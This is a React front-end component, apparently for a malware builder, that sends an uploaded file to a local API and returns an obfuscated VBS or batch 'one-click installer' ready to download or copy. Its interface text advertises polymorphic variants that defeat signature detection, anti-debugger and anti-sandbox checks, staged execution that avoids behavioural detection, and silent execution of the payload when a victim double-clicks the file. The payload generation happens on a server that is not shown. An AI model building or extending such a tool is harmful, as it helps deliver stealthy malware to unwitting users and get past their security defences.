import React, { useState, useEffect } from 'react';
import axios from 'axios';

const API_BASE = 'http://localhost:5000/api';

export default function OneClickInstaller({ uploadedFile, loading, onGenerate }) {
  const [styles, setStyles] = useState([]);
  const [selectedStyle, setSelectedStyle] = useState('polymorphic');
  const [fileType, setFileType] = useState('vbs');
  const [showAdvanced, setShowAdvanced] = useState(false);
  const [payload, setPayload] = useState(null);
  const [generating, setGenerating] = useState(false);

  useEffect(() => {
    fetchStyles();
  }, []);

  const fetchStyles = async () => {
    try {
      const response = await axios.get(`${API_BASE}/one-click-styles`);
      setStyles(response.data.styles);
    } catch (err) {
      console.error('Failed to fetch styles', err);
    }
  };

  const handleGenerate = async () => {
    if (!uploadedFile) {
      alert('Please upload a file first');
      return;
    }

    setGenerating(true);

    try {
      const response = await axios.post(`${API_BASE}/generate-one-click`, {
        file_id: uploadedFile.id,
        obfuscation_style: selectedStyle,
        file_type: fileType,
      });

      setPayload({
        id: response.data.output_id,
        filename: response.data.filename,
        content: response.data.payload,
        instructions: response.data.instructions,
        size: response.data.size,
      });

      onGenerate?.(response.data);
    } catch (err) {
      alert(err.response?.data?.error || 'Generation failed');
    } finally {
      setGenerating(false);
    }
  };

  const handleDownload = async () => {
    if (!payload?.id) return;

    try {
      const response = await axios.get(`${API_BASE}/download/${payload.id}`, {
        responseType: 'blob',
      });

      const url = window.URL.createObjectURL(new Blob([response.data]));
      const link = document.createElement('a');
      link.href = url;
      link.setAttribute('download', payload.filename);
      document.body.appendChild(link);
      link.click();
      link.parentElement.removeChild(link);
    } catch (err) {
      console.error('Download failed:', err);
    }
  };

  const handleCopy = () => {
    if (payload?.content) {
      navigator.clipboard.writeText(payload.content);
      alert('Copied to clipboard!');
    }
  };

  const styleInfo = {
    polymorphic: {
      desc: 'Multiple polymorphic variants for evasion',
      tips: 'Changes structure on every generation - signature based detection fails',
      size: '6-10 KB',
    },
    anti_analysis: {
      desc: 'Detects and defeats analysis tools',
      tips: 'Detects debuggers, sandboxes, and analysis environments',
      size: '7-12 KB',
    },
    multi_stage: {
      desc: 'Multi-stage installation with delays',
      tips: 'Stages execution to avoid behavioral detection',
      size: '5-9 KB',
    },
    silent: {
      desc: 'Silent installation with no output',
      tips: 'Zero visible output, completely silent execution',
      size: '4-8 KB',
    },
  };

  const currentStyleInfo = styleInfo[selectedStyle] || {};

  return (
    <div style={{ padding: '1.5rem' }}>
      <h3 style={{ color: '#00d4ff', marginBottom: '0.5rem' }}>⚡ One-Click Installer</h3>
      <p style={{ color: '#a0a0a0', fontSize: '0.9rem', margin: '0 0 1rem 0' }}>
        Silent, automatic installation - no user interaction required
      </p>

      <div className="form-group">
        <label style={{ marginBottom: '0.8rem' }}>
          Obfuscation Style
          <span
            style={{
              marginLeft: '0.5rem',
              fontSize: '0.75rem',
              color: '#ffb74d',
              fontWeight: 'normal',
            }}
          >
            (Pick one - all equally effective)
          </span>
        </label>
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.8rem' }}>
          {Object.entries(styles).map(([key, desc]) => (
            <div
              key={key}
              className={`fingerprint-card ${selectedStyle === key ? 'selected' : ''}`}
              onClick={() => setSelectedStyle(key)}
              style={{ cursor: 'pointer' }}
            >
              <div className="fingerprint-name">{key.toUpperCase()}</div>
              <div className="fingerprint-desc" style={{ fontSize: '0.75rem' }}>
                {desc}
              </div>
            </div>
          ))}
        </div>

        {currentStyleInfo && (
          <div
            style={{
              marginTop: '1rem',
              padding: '0.8rem',
              backgroundColor: 'rgba(0, 212, 255, 0.08)',
              border: '1px solid rgba(0, 212, 255, 0.3)',
              borderRadius: '6px',
              fontSize: '0.85rem',
            }}
          >
            <p style={{ margin: '0 0 0.4rem 0', color: '#a0a0a0' }}>
              <strong>✓ {selectedStyle.toUpperCase()}:</strong>
            </p>
            <p style={{ margin: '0.3rem 0', color: '#a0a0a0' }}>
              {currentStyleInfo.tips}
            </p>
            <p style={{ margin: '0.3rem 0 0 0', color: '#00d4ff', fontSize: '0.8rem' }}>
              Expected size: {currentStyleInfo.size}
            </p>
          </div>
        )}
      </div>

      <div className="form-group">
        <label>Output Format (Recommended: VBS):</label>
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.8rem' }}>
          {[
            {
              value: 'vbs',
              label: 'VBS Script ⭐',
              desc: 'Native Windows script - best compatibility',
            },
            {
              value: 'bat',
              label: 'Batch File',
              desc: 'Batch wrapper - for compatibility',
            },
          ].map((opt) => (
            <div
              key={opt.value}
              className={`fingerprint-card ${fileType === opt.value ? 'selected' : ''}`}
              onClick={() => setFileType(opt.value)}
              style={{
                cursor: 'pointer',
                borderColor:
                  opt.value === 'vbs' && fileType !== 'vbs'
                    ? 'rgba(76, 175, 80, 0.5)'
                    : undefined,
              }}
            >
              <div className="fingerprint-name">{opt.label}</div>
              <div className="fingerprint-desc" style={{ fontSize: '0.75rem' }}>
                {opt.desc}
              </div>
            </div>
          ))}
        </div>
      </div>

      <button
        className="btn-primary"
        onClick={handleGenerate}
        disabled={!uploadedFile || generating}
        style={{ width: '100%' }}
      >
        {generating ? '⏳ Generating...' : '✨ Generate One-Click Installer'}
      </button>

      <div
        style={{
          marginTop: '1rem',
          padding: '1rem',
          backgroundColor: 'rgba(76, 175, 80, 0.08)',
          border: '1px solid rgba(76, 175, 80, 0.3)',
          borderRadius: '6px',
          fontSize: '0.85rem',
          color: '#a0a0a0',
        }}
      >
        <p style={{ margin: '0 0 0.5rem 0', color: '#4caf50', fontWeight: 'bold' }}>
          ✓ How It Works:
        </p>
        <ul style={{ margin: '0.5rem 0', paddingLeft: '1.5rem' }}>
          <li>User double-clicks the downloaded file</li>
          <li>Installation runs completely silent in background</li>
          <li>Zero visible output or window popups</li>
          <li>Payload extracts and executes automatically</li>
          <li>Typical payload size: 5-12 KB</li>
          <li>Works on all Windows versions XP through 11</li>
        </ul>
      </div>

      {payload && (
        <div
          style={{
            marginTop: '1.5rem',
            padding: '1rem',
            backgroundColor: 'rgba(76, 175, 80, 0.1)',
            border: '1px solid rgba(76, 175, 80, 0.3)',
            borderRadius: '6px',
          }}
        >
          <h4 style={{ color: '#4caf50', marginTop: 0 }}>✓ Installer Generated</h4>

          <div style={{ marginBottom: '1rem' }}>
            <p>
              <strong>Filename:</strong> <code>{payload.filename}</code>
            </p>
            <p>
              <strong>Size:</strong> {(payload.size / 1024).toFixed(2)} KB
            </p>
          </div>

          <div style={{ marginBottom: '1rem', fontSize: '0.9rem', color: '#a0a0a0' }}>
            <p>
              <strong>Installation Instructions:</strong>
            </p>
            <pre style={{ whiteSpace: 'pre-wrap', color: '#4caf50' }}>{payload.instructions}</pre>
          </div>

          <div style={{ display: 'flex', gap: '0.8rem', flexWrap: 'wrap' }}>
            <button className="btn-primary" onClick={handleDownload}>
              💾 Download Installer
            </button>
            <button className="btn-secondary" onClick={handleCopy}>
              📋 Copy Code
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
